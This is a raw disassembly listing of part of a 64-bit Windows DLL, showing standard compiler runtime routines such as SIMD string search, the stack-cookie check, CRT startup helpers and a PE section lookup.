   1800041c5:	41 83 e1 1c          	and    $0x1c,%r9d
   1800041c9:	74 2d                	je     0x1800041f8
   1800041cb:	41 8b d1             	mov    %r9d,%edx
   1800041ce:	48 8d 05 7b 46 00 00 	lea    0x467b(%rip),%rax        # 0x180008850
   1800041d5:	48 83 e2 fc          	and    $0xfffffffffffffffc,%rdx
   1800041d9:	48 2b c2             	sub    %rdx,%rax
   1800041dc:	c5 fe 6f 10          	vmovdqu (%rax),%ymm2
   1800041e0:	c4 e2 6d 8c 01       	vpmaskmovd (%rcx),%ymm2,%ymm0
   1800041e5:	c5 fd 76 cb          	vpcmpeqd %ymm3,%ymm0,%ymm1
   1800041e9:	c5 f5 db d2          	vpand  %ymm2,%ymm1,%ymm2
   1800041ed:	c5 fd d7 c2          	vpmovmskb %ymm2,%eax
   1800041f1:	85 c0                	test   %eax,%eax
   1800041f3:	75 0a                	jne    0x1800041ff
   1800041f5:	49 03 c9             	add    %r9,%rcx
   1800041f8:	48 8b c1             	mov    %rcx,%rax
   1800041fb:	c5 f8 77             	vzeroupper
   1800041fe:	c3                   	ret
   1800041ff:	c5 f8 77             	vzeroupper
   180004202:	f3 0f bc c0          	tzcnt  %eax,%eax
   180004206:	8b c0                	mov    %eax,%eax
   180004208:	48 03 c1             	add    %rcx,%rax
   18000420b:	c3                   	ret
   18000420c:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   180004210:	74 37                	je     0x180004249
   180004212:	a8 04                	test   $0x4,%al
   180004214:	74 33                	je     0x180004249
   180004216:	66 41 0f 6e c8       	movd   %r8d,%xmm1
   18000421b:	4d 8d 14 09          	lea    (%r9,%rcx,1),%r10
   18000421f:	66 0f 70 c9 00       	pshufd $0x0,%xmm1,%xmm1
   180004224:	0f 1f 40 00          	nopl   0x0(%rax)
   180004228:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000422f:	00 
   180004230:	f3 0f 6f 01          	movdqu (%rcx),%xmm0
   180004234:	66 0f 76 c1          	pcmpeqd %xmm1,%xmm0
   180004238:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   18000423c:	85 c0                	test   %eax,%eax
   18000423e:	75 22                	jne    0x180004262
   180004240:	48 83 c1 10          	add    $0x10,%rcx
   180004244:	49 3b ca             	cmp    %r10,%rcx
   180004247:	75 e7                	jne    0x180004230
   180004249:	48 3b ca             	cmp    %rdx,%rcx
   18000424c:	74 10                	je     0x18000425e
   18000424e:	66 90                	xchg   %ax,%ax
   180004250:	44 39 01             	cmp    %r8d,(%rcx)
   180004253:	74 09                	je     0x18000425e
   180004255:	48 83 c1 04          	add    $0x4,%rcx
   180004259:	48 3b ca             	cmp    %rdx,%rcx
   18000425c:	75 f2                	jne    0x180004250
   18000425e:	48 8b c1             	mov    %rcx,%rax
   180004261:	c3                   	ret
   180004262:	0f bc c0             	bsf    %eax,%eax
   180004265:	48 03 c1             	add    %rcx,%rax
   180004268:	c3                   	ret
   180004269:	cc                   	int3
   18000426a:	cc                   	int3
   18000426b:	cc                   	int3
   18000426c:	cc                   	int3
   18000426d:	cc                   	int3
   18000426e:	cc                   	int3
   18000426f:	cc                   	int3
   180004270:	40 53                	rex push %rbx
   180004272:	57                   	push   %rdi
   180004273:	41 56                	push   %r14
   180004275:	48 83 ec 60          	sub    $0x60,%rsp
   180004279:	48 8b 05 c0 6d 00 00 	mov    0x6dc0(%rip),%rax        # 0x18000b040
   180004280:	48 33 c4             	xor    %rsp,%rax
   180004283:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180004288:	49 8b f9             	mov    %r9,%rdi
   18000428b:	4c 8b f2             	mov    %rdx,%r14
   18000428e:	4d 8b c8             	mov    %r8,%r9
   180004291:	48 8b d9             	mov    %rcx,%rbx
   180004294:	48 85 ff             	test   %rdi,%rdi
   180004297:	75 08                	jne    0x1800042a1
   180004299:	48 8b c1             	mov    %rcx,%rax
   18000429c:	e9 52 01 00 00       	jmp    0x1800043f3
   1800042a1:	48 83 ff 01          	cmp    $0x1,%rdi
   1800042a5:	75 0e                	jne    0x1800042b5
   1800042a7:	45 0f b6 00          	movzbl (%r8),%r8d
   1800042ab:	e8 d0 fd ff ff       	call   0x180004080
   1800042b0:	e9 3e 01 00 00       	jmp    0x1800043f3
   1800042b5:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   1800042ba:	49 8b ce             	mov    %r14,%rcx
   1800042bd:	48 2b cb             	sub    %rbx,%rcx
   1800042c0:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   1800042c5:	0f 29 74 24 40       	movaps %xmm6,0x40(%rsp)
   1800042ca:	48 3b cf             	cmp    %rdi,%rcx
   1800042cd:	0f 82 0e 01 00 00    	jb     0x1800043e1
   1800042d3:	f6 05 3a 6d 00 00 04 	testb  $0x4,0x6d3a(%rip)        # 0x18000b014
   1800042da:	0f 84 29 01 00 00    	je     0x180004409
   1800042e0:	48 83 f9 10          	cmp    $0x10,%rcx
   1800042e4:	0f 82 1f 01 00 00    	jb     0x180004409
   1800042ea:	48 83 ff 10          	cmp    $0x10,%rdi
   1800042ee:	0f 87 82 00 00 00    	ja     0x180004376
   1800042f4:	be 10 00 00 00       	mov    $0x10,%esi
   1800042f9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800042fe:	2b f7                	sub    %edi,%esi
   180004300:	4c 8b c7             	mov    %rdi,%r8
   180004303:	49 8b d1             	mov    %r9,%rdx
   180004306:	e8 71 11 00 00       	call   0x18000547c
   18000430b:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   180004311:	4d 8d 46 f0          	lea    -0x10(%r14),%r8
   180004315:	f3 0f 6f 03          	movdqu (%rbx),%xmm0
   180004319:	8b c7                	mov    %edi,%eax
   18000431b:	ba 10 00 00 00       	mov    $0x10,%edx
   180004320:	66 0f 3a 61 f0 0c    	pcmpestri $0xc,%xmm0,%xmm6
   180004326:	72 05                	jb     0x18000432d
   180004328:	48 03 da             	add    %rdx,%rbx
   18000432b:	eb 0e                	jmp    0x18000433b
   18000432d:	48 63 c1             	movslq %ecx,%rax
   180004330:	48 03 d8             	add    %rax,%rbx
   180004333:	3b ce                	cmp    %esi,%ecx
   180004335:	0f 8e 0c 01 00 00    	jle    0x180004447
   18000433b:	49 3b d8             	cmp    %r8,%rbx
   18000433e:	76 d5                	jbe    0x180004315
   180004340:	49 8b f6             	mov    %r14,%rsi
   180004343:	48 2b f3             	sub    %rbx,%rsi
   180004346:	0f 84 95 00 00 00    	je     0x1800043e1
   18000434c:	4c 8b c6             	mov    %rsi,%r8
   18000434f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180004354:	48 8b d3             	mov    %rbx,%rdx
   180004357:	e8 20 11 00 00       	call   0x18000547c
   18000435c:	66 0f 6f 44 24 20    	movdqa 0x20(%rsp),%xmm0
   180004362:	8b c7                	mov    %edi,%eax
   180004364:	8b d6                	mov    %esi,%edx
   180004366:	66 0f 3a 61 f0 0c    	pcmpestri $0xc,%xmm0,%xmm6
   18000436c:	73 73                	jae    0x1800043e1
   18000436e:	48 63 c1             	movslq %ecx,%rax
   180004371:	48 03 c3             	add    %rbx,%rax
   180004374:	eb 6e                	jmp    0x1800043e4
   180004376:	f3 41 0f 6f 30       	movdqu (%r8),%xmm6
   18000437b:	48 8b f3             	mov    %rbx,%rsi
   18000437e:	49 8d 68 10          	lea    0x10(%r8),%rbp
   180004382:	48 2b f7             	sub    %rdi,%rsi
   180004385:	48 03 f1             	add    %rcx,%rsi
   180004388:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000438f:	00 
   180004390:	f3 0f 6f 03          	movdqu (%rbx),%xmm0
   180004394:	b8 10 00 00 00       	mov    $0x10,%eax
   180004399:	8b d0                	mov    %eax,%edx
   18000439b:	66 0f 3a 61 f0 0c    	pcmpestri $0xc,%xmm0,%xmm6
   1800043a1:	72 05                	jb     0x1800043a8
   1800043a3:	48 03 d8             	add    %rax,%rbx
   1800043a6:	eb 34                	jmp    0x1800043dc
   1800043a8:	85 c9                	test   %ecx,%ecx
   1800043aa:	74 19                	je     0x1800043c5
   1800043ac:	48 63 c1             	movslq %ecx,%rax
   1800043af:	48 03 d8             	add    %rax,%rbx
   1800043b2:	48 3b de             	cmp    %rsi,%rbx
   1800043b5:	77 2a                	ja     0x1800043e1
   1800043b7:	f3 0f 6f 03          	movdqu (%rbx),%xmm0
   1800043bb:	0f 57 c6             	xorps  %xmm6,%xmm0
   1800043be:	66 0f 38 17 c0       	ptest  %xmm0,%xmm0
   1800043c3:	75 14                	jne    0x1800043d9
   1800043c5:	4c 8d 47 f0          	lea    -0x10(%rdi),%r8
   1800043c9:	48 8b d5             	mov    %rbp,%rdx
   1800043cc:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   1800043d0:	e8 a1 10 00 00       	call   0x180005476
   1800043d5:	85 c0                	test   %eax,%eax
   1800043d7:	74 6e                	je     0x180004447
   1800043d9:	48 ff c3             	inc    %rbx
   1800043dc:	48 3b de             	cmp    %rsi,%rbx
   1800043df:	76 af                	jbe    0x180004390
   1800043e1:	49 8b c6             	mov    %r14,%rax
   1800043e4:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1800043e9:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1800043ee:	0f 28 74 24 40       	movaps 0x40(%rsp),%xmm6
   1800043f3:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1800043f8:	48 33 cc             	xor    %rsp,%rcx
   1800043fb:	e8 90 00 00 00       	call   0x180004490
   180004400:	48 83 c4 60          	add    $0x60,%rsp
   180004404:	41 5e                	pop    %r14
   180004406:	5f                   	pop    %rdi
   180004407:	5b                   	pop    %rbx
   180004408:	c3                   	ret
   180004409:	48 8b d3             	mov    %rbx,%rdx
   18000440c:	48 2b d7             	sub    %rdi,%rdx
   18000440f:	48 ff c2             	inc    %rdx
   180004412:	48 03 d1             	add    %rcx,%rdx
   180004415:	48 3b da             	cmp    %rdx,%rbx
   180004418:	74 c7                	je     0x1800043e1
   18000441a:	45 0f b6 00          	movzbl (%r8),%r8d
   18000441e:	4c 2b cb             	sub    %rbx,%r9
   180004421:	44 38 03             	cmp    %r8b,(%rbx)
   180004424:	75 26                	jne    0x18000444c
   180004426:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   18000442a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180004430:	41 0f b6 04 09       	movzbl (%r9,%rcx,1),%eax
   180004435:	38 01                	cmp    %al,(%rcx)
   180004437:	75 13                	jne    0x18000444c
   180004439:	48 ff c1             	inc    %rcx
   18000443c:	48 8b c1             	mov    %rcx,%rax
   18000443f:	48 2b c3             	sub    %rbx,%rax
   180004442:	48 3b c7             	cmp    %rdi,%rax
   180004445:	75 e9                	jne    0x180004430
   180004447:	48 8b c3             	mov    %rbx,%rax
   18000444a:	eb 98                	jmp    0x1800043e4
   18000444c:	48 ff c3             	inc    %rbx
   18000444f:	49 ff c9             	dec    %r9
   180004452:	48 3b da             	cmp    %rdx,%rbx
   180004455:	75 ca                	jne    0x180004421
   180004457:	eb 88                	jmp    0x1800043e1
   180004459:	cc                   	int3
   18000445a:	cc                   	int3
   18000445b:	cc                   	int3
   18000445c:	cc                   	int3
   18000445d:	cc                   	int3
   18000445e:	cc                   	int3
   18000445f:	cc                   	int3
   180004460:	e9 1b fd ff ff       	jmp    0x180004180
   180004465:	cc                   	int3
   180004466:	cc                   	int3
   180004467:	cc                   	int3
   180004468:	cc                   	int3
   180004469:	cc                   	int3
   18000446a:	cc                   	int3
   18000446b:	cc                   	int3
   18000446c:	cc                   	int3
   18000446d:	cc                   	int3
   18000446e:	cc                   	int3
   18000446f:	cc                   	int3
   180004470:	e9 fb fd ff ff       	jmp    0x180004270
   180004475:	cc                   	int3
   180004476:	cc                   	int3
   180004477:	cc                   	int3
   180004478:	cc                   	int3
   180004479:	cc                   	int3
   18000447a:	cc                   	int3
   18000447b:	cc                   	int3
   18000447c:	cc                   	int3
   18000447d:	cc                   	int3
   18000447e:	cc                   	int3
   18000447f:	cc                   	int3
   180004480:	cc                   	int3
   180004481:	cc                   	int3
   180004482:	cc                   	int3
   180004483:	cc                   	int3
   180004484:	cc                   	int3
   180004485:	cc                   	int3
   180004486:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000448d:	00 00 00 
   180004490:	48 3b 0d a9 6b 00 00 	cmp    0x6ba9(%rip),%rcx        # 0x18000b040
   180004497:	75 10                	jne    0x1800044a9
   180004499:	48 c1 c1 10          	rol    $0x10,%rcx
   18000449d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   1800044a2:	75 01                	jne    0x1800044a5
   1800044a4:	c3                   	ret
   1800044a5:	48 c1 c9 10          	ror    $0x10,%rcx
   1800044a9:	e9 4a 0b 00 00       	jmp    0x180004ff8
   1800044ae:	cc                   	int3
   1800044af:	cc                   	int3
   1800044b0:	40 53                	rex push %rbx
   1800044b2:	48 83 ec 20          	sub    $0x20,%rsp
   1800044b6:	48 8b d9             	mov    %rcx,%rbx
   1800044b9:	eb 0f                	jmp    0x1800044ca
   1800044bb:	48 8b cb             	mov    %rbx,%rcx
   1800044be:	e8 e9 0f 00 00       	call   0x1800054ac
   1800044c3:	85 c0                	test   %eax,%eax
   1800044c5:	74 13                	je     0x1800044da
   1800044c7:	48 8b cb             	mov    %rbx,%rcx
   1800044ca:	e8 d7 0f 00 00       	call   0x1800054a6
   1800044cf:	48 85 c0             	test   %rax,%rax
   1800044d2:	74 e7                	je     0x1800044bb
   1800044d4:	48 83 c4 20          	add    $0x20,%rsp
   1800044d8:	5b                   	pop    %rbx
   1800044d9:	c3                   	ret
   1800044da:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   1800044de:	74 06                	je     0x1800044e6
   1800044e0:	e8 7f 0c 00 00       	call   0x180005164
   1800044e5:	cc                   	int3
   1800044e6:	e8 35 ce ff ff       	call   0x180001320
   1800044eb:	cc                   	int3
   1800044ec:	48 8b c4             	mov    %rsp,%rax
   1800044ef:	4c 89 48 20          	mov    %r9,0x20(%rax)
   1800044f3:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1800044f7:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1800044fb:	53                   	push   %rbx
   1800044fc:	56                   	push   %rsi
   1800044fd:	57                   	push   %rdi
   1800044fe:	41 56                	push   %r14
   180004500:	48 83 ec 38          	sub    $0x38,%rsp
   180004504:	4d 8b f1             	mov    %r9,%r14
   180004507:	49 8b d8             	mov    %r8,%rbx
   18000450a:	48 8b f2             	mov    %rdx,%rsi
   18000450d:	c6 40 c8 00          	movb   $0x0,-0x38(%rax)
   180004511:	48 8b fa             	mov    %rdx,%rdi
   180004514:	49 0f af f8          	imul   %r8,%rdi
   180004518:	48 03 f9             	add    %rcx,%rdi
   18000451b:	48 89 78 08          	mov    %rdi,0x8(%rax)
   18000451f:	48 8b c3             	mov    %rbx,%rax
   180004522:	48 ff cb             	dec    %rbx
   180004525:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   18000452a:	48 85 c0             	test   %rax,%rax
   18000452d:	74 19                	je     0x180004548
   18000452f:	48 2b fe             	sub    %rsi,%rdi
   180004532:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   180004537:	48 8b cf             	mov    %rdi,%rcx
   18000453a:	49 8b c6             	mov    %r14,%rax
   18000453d:	48 8b 15 74 1d 00 00 	mov    0x1d74(%rip),%rdx        # 0x1800062b8
   180004544:	ff d2                	call   *%rdx
   180004546:	eb d7                	jmp    0x18000451f
   180004548:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   18000454d:	48 83 c4 38          	add    $0x38,%rsp
   180004551:	41 5e                	pop    %r14
   180004553:	5f                   	pop    %rdi
   180004554:	5e                   	pop    %rsi
   180004555:	5b                   	pop    %rbx
   180004556:	c3                   	ret
   180004557:	cc                   	int3
   180004558:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000455d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180004562:	57                   	push   %rdi
   180004563:	41 56                	push   %r14
   180004565:	41 57                	push   %r15
   180004567:	48 83 ec 40          	sub    $0x40,%rsp
   18000456b:	4d 8b f1             	mov    %r9,%r14
   18000456e:	49 8b f0             	mov    %r8,%rsi
   180004571:	4c 8b fa             	mov    %rdx,%r15
   180004574:	48 8b f9             	mov    %rcx,%rdi
   180004577:	33 db                	xor    %ebx,%ebx
   180004579:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   18000457e:	48 3b de             	cmp    %rsi,%rbx
   180004581:	74 19                	je     0x18000459c
   180004583:	49 2b ff             	sub    %r15,%rdi
   180004586:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   18000458b:	48 8b cf             	mov    %rdi,%rcx
   18000458e:	49 8b c6             	mov    %r14,%rax
   180004591:	ff 15 21 1d 00 00    	call   *0x1d21(%rip)        # 0x1800062b8
   180004597:	48 ff c3             	inc    %rbx
   18000459a:	eb dd                	jmp    0x180004579
   18000459c:	eb 00                	jmp    0x18000459e
   18000459e:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1800045a3:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1800045a8:	48 83 c4 40          	add    $0x40,%rsp
   1800045ac:	41 5f                	pop    %r15
   1800045ae:	41 5e                	pop    %r14
   1800045b0:	5f                   	pop    %rdi
   1800045b1:	c3                   	ret
   1800045b2:	cc                   	int3
   1800045b3:	cc                   	int3
   1800045b4:	48 83 ec 28          	sub    $0x28,%rsp
   1800045b8:	e8 d3 0b 00 00       	call   0x180005190
   1800045bd:	85 c0                	test   %eax,%eax
   1800045bf:	74 21                	je     0x1800045e2
   1800045c1:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1800045c8:	00 00 
   1800045ca:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1800045ce:	eb 05                	jmp    0x1800045d5
   1800045d0:	48 3b c8             	cmp    %rax,%rcx
   1800045d3:	74 14                	je     0x1800045e9
   1800045d5:	33 c0                	xor    %eax,%eax
   1800045d7:	f0 48 0f b1 0d 68 6b 	lock cmpxchg %rcx,0x6b68(%rip)        # 0x18000b148
   1800045de:	00 00 
   1800045e0:	75 ee                	jne    0x1800045d0
   1800045e2:	32 c0                	xor    %al,%al
   1800045e4:	48 83 c4 28          	add    $0x28,%rsp
   1800045e8:	c3                   	ret
   1800045e9:	b0 01                	mov    $0x1,%al
   1800045eb:	eb f7                	jmp    0x1800045e4
   1800045ed:	cc                   	int3
   1800045ee:	cc                   	int3
   1800045ef:	cc                   	int3
   1800045f0:	48 83 ec 28          	sub    $0x28,%rsp
   1800045f4:	e8 97 0b 00 00       	call   0x180005190
   1800045f9:	85 c0                	test   %eax,%eax
   1800045fb:	74 07                	je     0x180004604
   1800045fd:	e8 2a 07 00 00       	call   0x180004d2c
   180004602:	eb 19                	jmp    0x18000461d
   180004604:	e8 7f 0b 00 00       	call   0x180005188
   180004609:	8b c8                	mov    %eax,%ecx
   18000460b:	e8 ae 0e 00 00       	call   0x1800054be
   180004610:	85 c0                	test   %eax,%eax
   180004612:	74 04                	je     0x180004618
   180004614:	32 c0                	xor    %al,%al
   180004616:	eb 07                	jmp    0x18000461f
   180004618:	e8 a7 0e 00 00       	call   0x1800054c4
   18000461d:	b0 01                	mov    $0x1,%al
   18000461f:	48 83 c4 28          	add    $0x28,%rsp
   180004623:	c3                   	ret
   180004624:	48 83 ec 28          	sub    $0x28,%rsp
   180004628:	33 c9                	xor    %ecx,%ecx
   18000462a:	e8 2d 01 00 00       	call   0x18000475c
   18000462f:	84 c0                	test   %al,%al
   180004631:	0f 95 c0             	setne  %al
   180004634:	48 83 c4 28          	add    $0x28,%rsp
   180004638:	c3                   	ret
   180004639:	cc                   	int3
   18000463a:	cc                   	int3
   18000463b:	cc                   	int3
   18000463c:	48 83 ec 28          	sub    $0x28,%rsp
   180004640:	e8 b7 0e 00 00       	call   0x1800054fc
   180004645:	84 c0                	test   %al,%al
   180004647:	75 04                	jne    0x18000464d
   180004649:	32 c0                	xor    %al,%al
   18000464b:	eb 12                	jmp    0x18000465f
   18000464d:	e8 aa 0e 00 00       	call   0x1800054fc
   180004652:	84 c0                	test   %al,%al
   180004654:	75 07                	jne    0x18000465d
   180004656:	e8 a1 0e 00 00       	call   0x1800054fc
   18000465b:	eb ec                	jmp    0x180004649
   18000465d:	b0 01                	mov    $0x1,%al
   18000465f:	48 83 c4 28          	add    $0x28,%rsp
   180004663:	c3                   	ret
   180004664:	48 83 ec 28          	sub    $0x28,%rsp
   180004668:	e8 8f 0e 00 00       	call   0x1800054fc
   18000466d:	e8 8a 0e 00 00       	call   0x1800054fc
   180004672:	b0 01                	mov    $0x1,%al
   180004674:	48 83 c4 28          	add    $0x28,%rsp
   180004678:	c3                   	ret
   180004679:	cc                   	int3
   18000467a:	cc                   	int3
   18000467b:	cc                   	int3
   18000467c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004681:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180004686:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000468b:	57                   	push   %rdi
   18000468c:	48 83 ec 20          	sub    $0x20,%rsp
   180004690:	49 8b f9             	mov    %r9,%rdi
   180004693:	49 8b f0             	mov    %r8,%rsi
   180004696:	8b da                	mov    %edx,%ebx
   180004698:	48 8b e9             	mov    %rcx,%rbp
   18000469b:	e8 f0 0a 00 00       	call   0x180005190
   1800046a0:	85 c0                	test   %eax,%eax
   1800046a2:	75 16                	jne    0x1800046ba
   1800046a4:	83 fb 01             	cmp    $0x1,%ebx
   1800046a7:	75 11                	jne    0x1800046ba
   1800046a9:	4c 8b c6             	mov    %rsi,%r8
   1800046ac:	33 d2                	xor    %edx,%edx
   1800046ae:	48 8b cd             	mov    %rbp,%rcx
   1800046b1:	48 8b c7             	mov    %rdi,%rax
   1800046b4:	ff 15 fe 1b 00 00    	call   *0x1bfe(%rip)        # 0x1800062b8
   1800046ba:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   1800046bf:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   1800046c3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800046c8:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1800046cd:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1800046d2:	48 83 c4 20          	add    $0x20,%rsp
   1800046d6:	5f                   	pop    %rdi
   1800046d7:	e9 dc 0d 00 00       	jmp    0x1800054b8
   1800046dc:	48 83 ec 28          	sub    $0x28,%rsp
   1800046e0:	e8 ab 0a 00 00       	call   0x180005190
   1800046e5:	85 c0                	test   %eax,%eax
   1800046e7:	74 10                	je     0x1800046f9
   1800046e9:	48 8d 0d 68 6a 00 00 	lea    0x6a68(%rip),%rcx        # 0x18000b158
   1800046f0:	48 83 c4 28          	add    $0x28,%rsp
   1800046f4:	e9 dd 0d 00 00       	jmp    0x1800054d6
   1800046f9:	e8 02 0e 00 00       	call   0x180005500
   1800046fe:	85 c0                	test   %eax,%eax
   180004700:	75 05                	jne    0x180004707
   180004702:	e8 db 0d 00 00       	call   0x1800054e2
   180004707:	48 83 c4 28          	add    $0x28,%rsp
   18000470b:	c3                   	ret
   18000470c:	48 83 ec 28          	sub    $0x28,%rsp
   180004710:	33 c9                	xor    %ecx,%ecx
   180004712:	e8 e5 0d 00 00       	call   0x1800054fc
   180004717:	48 83 c4 28          	add    $0x28,%rsp
   18000471b:	e9 dc 0d 00 00       	jmp    0x1800054fc
   180004720:	48 83 ec 28          	sub    $0x28,%rsp
   180004724:	85 c9                	test   %ecx,%ecx
   180004726:	75 07                	jne    0x18000472f
   180004728:	c6 05 21 6a 00 00 01 	movb   $0x1,0x6a21(%rip)        # 0x18000b150
   18000472f:	e8 f8 05 00 00       	call   0x180004d2c
   180004734:	e8 c3 0d 00 00       	call   0x1800054fc
   180004739:	84 c0                	test   %al,%al
   18000473b:	75 04                	jne    0x180004741
   18000473d:	32 c0                	xor    %al,%al
   18000473f:	eb 14                	jmp    0x180004755
   180004741:	e8 b6 0d 00 00       	call   0x1800054fc
   180004746:	84 c0                	test   %al,%al
   180004748:	75 09                	jne    0x180004753
   18000474a:	33 c9                	xor    %ecx,%ecx
   18000474c:	e8 ab 0d 00 00       	call   0x1800054fc
   180004751:	eb ea                	jmp    0x18000473d
   180004753:	b0 01                	mov    $0x1,%al
   180004755:	48 83 c4 28          	add    $0x28,%rsp
   180004759:	c3                   	ret
   18000475a:	cc                   	int3
   18000475b:	cc                   	int3
   18000475c:	40 53                	rex push %rbx
   18000475e:	48 83 ec 20          	sub    $0x20,%rsp
   180004762:	80 3d e8 69 00 00 00 	cmpb   $0x0,0x69e8(%rip)        # 0x18000b151
   180004769:	8b d9                	mov    %ecx,%ebx
   18000476b:	75 67                	jne    0x1800047d4
   18000476d:	83 f9 01             	cmp    $0x1,%ecx
   180004770:	77 6a                	ja     0x1800047dc
   180004772:	e8 19 0a 00 00       	call   0x180005190
   180004777:	85 c0                	test   %eax,%eax
   180004779:	74 28                	je     0x1800047a3
   18000477b:	85 db                	test   %ebx,%ebx
   18000477d:	75 24                	jne    0x1800047a3
   18000477f:	48 8d 0d d2 69 00 00 	lea    0x69d2(%rip),%rcx        # 0x18000b158
   180004786:	e8 3f 0d 00 00       	call   0x1800054ca
   18000478b:	85 c0                	test   %eax,%eax
   18000478d:	75 10                	jne    0x18000479f
   18000478f:	48 8d 0d da 69 00 00 	lea    0x69da(%rip),%rcx        # 0x18000b170
   180004796:	e8 2f 0d 00 00       	call   0x1800054ca
   18000479b:	85 c0                	test   %eax,%eax
   18000479d:	74 2e                	je     0x1800047cd
   18000479f:	32 c0                	xor    %al,%al
   1800047a1:	eb 33                	jmp    0x1800047d6
   1800047a3:	66 0f 6f 05 c5 40 00 	movdqa 0x40c5(%rip),%xmm0        # 0x180008870
   1800047aa:	00 
   1800047ab:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1800047af:	f3 0f 7f 05 a1 69 00 	movdqu %xmm0,0x69a1(%rip)        # 0x18000b158
   1800047b6:	00 
   1800047b7:	48 89 05 aa 69 00 00 	mov    %rax,0x69aa(%rip)        # 0x18000b168
   1800047be:	f3 0f 7f 05 aa 69 00 	movdqu %xmm0,0x69aa(%rip)        # 0x18000b170
   1800047c5:	00 
   1800047c6:	48 89 05 b3 69 00 00 	mov    %rax,0x69b3(%rip)        # 0x18000b180
   1800047cd:	c6 05 7d 69 00 00 01 	movb   $0x1,0x697d(%rip)        # 0x18000b151
   1800047d4:	b0 01                	mov    $0x1,%al
   1800047d6:	48 83 c4 20          	add    $0x20,%rsp
   1800047da:	5b                   	pop    %rbx
   1800047db:	c3                   	ret
   1800047dc:	b9 05 00 00 00       	mov    $0x5,%ecx
   1800047e1:	e8 c2 09 00 00       	call   0x1800051a8
   1800047e6:	cc                   	int3
   1800047e7:	cc                   	int3
   1800047e8:	48 83 ec 18          	sub    $0x18,%rsp
   1800047ec:	4c 8b c1             	mov    %rcx,%r8
   1800047ef:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1800047f4:	66 39 05 05 b8 ff ff 	cmp    %ax,-0x47fb(%rip)        # 0x180000000
   1800047fb:	75 78                	jne    0x180004875
   1800047fd:	48 63 0d 38 b8 ff ff 	movslq -0x47c8(%rip),%rcx        # 0x18000003c
   180004804:	48 8d 15 f5 b7 ff ff 	lea    -0x480b(%rip),%rdx        # 0x180000000
   18000480b:	48 03 ca             	add    %rdx,%rcx
   18000480e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180004814:	75 5f                	jne    0x180004875
   180004816:	b8 0b 02 00 00       	mov    $0x20b,%eax
   18000481b:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   18000481f:	75 54                	jne    0x180004875
   180004821:	4c 2b c2             	sub    %rdx,%r8
   180004824:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   180004828:	48 83 c2 18          	add    $0x18,%rdx
   18000482c:	48 03 d1             	add    %rcx,%rdx
   18000482f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   180004833:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180004837:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   18000483b:	48 89 14 24          	mov    %rdx,(%rsp)
   18000483f:	49 3b d1             	cmp    %r9,%rdx
   180004842:	74 18                	je     0x18000485c
   180004844:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   180004847:	4c 3b c1             	cmp    %rcx,%r8
   18000484a:	72 0a                	jb     0x180004856
   18000484c:	8b 42 08             	mov    0x8(%rdx),%eax
   18000484f:	03 c1                	add    %ecx,%eax
   180004851:	4c 3b c0             	cmp    %rax,%r8
   180004854:	72 08                	jb     0x18000485e
   180004856:	48 83 c2 28          	add    $0x28,%rdx
   18000485a:	eb df                	jmp    0x18000483b
   18000485c:	33 d2                	xor    %edx,%edx
   18000485e:	48 85 d2             	test   %rdx,%rdx
   180004861:	75 04                	jne    0x180004867
   180004863:	32 c0                	xor    %al,%al
   180004865:	eb 14                	jmp    0x18000487b
   180004867:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   18000486b:	7d 04                	jge    0x180004871
   18000486d:	32 c0                	xor    %al,%al
   18000486f:	eb 0a                	jmp    0x18000487b
   180004871:	b0 01                	mov    $0x1,%al
   180004873:	eb 06                	jmp    0x18000487b
   180004875:	32 c0                	xor    %al,%al
   180004877:	eb 02                	jmp    0x18000487b
   180004879:	32 c0                	xor    %al,%al
